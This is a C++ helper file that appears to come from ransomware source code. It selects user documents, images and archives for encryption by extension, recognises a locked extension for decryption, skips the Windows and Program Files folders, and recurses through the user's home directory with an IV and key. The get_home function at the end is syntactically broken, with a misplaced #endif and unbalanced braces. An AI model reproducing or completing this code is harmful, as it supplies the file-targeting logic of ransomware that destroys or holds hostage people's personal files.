#pragma warning(disable:4996)
#include "Utils.h"
#include <iostream>

#include <unordered_set>

string find_extension(const string& path)
{
	for (int i = path.size() - 1; i > 0; --i) {
		if (path[i] == '.')
			return string(path.begin() + i + 1, path.end());
	}
	return string("");
}

bool do_encrypt(const string& path)
{
	static std::unordered_set<string> ext_whitelist = {
		"pdf", "odt", "docx", "pptx", "txt",
		"mov", "zip", "jpg", "jpeg", "xls",
		"doc", 	"ppt", "gif", "png", "xlsx"
	};
	std::string ext = find_extension(path);
	return ext_whitelist.find(ext) != ext_whitelist.end();
}

bool do_decrypt(const string& path)
{
	return "." + find_extension(path) == LOCKED_EXTENSION;
}

bool is_valid_folder(const string& path)
{
	static std::unordered_set<string> unvalid_folder = {
		"Windows", "Program Files"
	};
	for (auto folder : unvalid_folder)
	{
		if(path.find(folder) != string::npos)
		{
			return false;
		}
	}
	return true;
}
void iterate(const path& parent, Processing_func process, PBYTE iv, PBYTE key) {
	string path;
	directory_iterator end_itr;

	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
		path = itr->path().string();

		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
			if (is_valid_folder(path))
			{
				iterate(path, process, iv, key);
			}
		}
		else {
			process(path,iv,key);
		}
	}
}


size_t getFileSize(const string path)
{
	std::ifstream plaintext;
	plaintext.open(path, std::ios::binary);
	if (!plaintext.is_open()) {
		return 0;
	}
	plaintext.seekg(0, std::ios::end);
	std::streampos plaintextLen = plaintext.tellg();
	plaintext.close();
	return plaintextLen;
}
string get_home() {
#ifdef _WIN32
	string path;

	char* drive = getenv("USERPROFILE");
	if (drive == NULL) {
		throw std::runtime_error("USERPROFILE environment variable not found");
	}
	else {
		path = drive;
	}

	return path;
#else
	struct passwd *pw;

	uid_t uid = geteuid();
	pw = getpwuid(uid);
	if (pw) {
		return string(pw->pw_dir);
#endif
	}
